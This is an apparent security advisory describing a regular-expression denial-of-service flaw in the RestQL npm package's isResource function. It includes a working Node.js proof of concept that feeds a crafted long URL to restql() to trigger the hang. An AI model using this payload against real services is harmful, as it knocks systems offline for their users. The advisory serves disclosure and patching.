# Overview

RestQL allows you to dynamically resolve the nested-linked resources of a RESTful API.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker providing a very long string to `isResource` function in `utils/isResource.js` can cause a Denial of Service.

# PoC

```node
var restql = require("restql");

/**
 * @constant {string} resource The resource to fetch.
 */
const resource = 'https://pokeapi.co.asdasdasd.asdsadasdsadsad.asdasdsad.asdsadasdsa.sadasdsadas.dasdasasdasd.432asdas3423.3423423423.234234243.234234234.23423423.24234.'

/**
 * @constant {Object} resolver The resolver to apply.
 */
const resolver = {
  'abilities[]?.ability.url': {
    'generation.url': {
      'main_region.url': null,
    },
  },
  'stats[].stat.url?': {
    'affecting_natures.increase[].url': null,
    'affecting_natures.decrease[].url': null,
  },
  'moves[].move?.url': null,
}

/**
 * @constant {Object} options The options to bypass.
 */
const options = {
  // ...
};

(async () => {
  try {
    const data = await restql(resource, resolver, options)

    console.log(data)
  } catch (error) {
    console.error(error.message)
  }
})()
```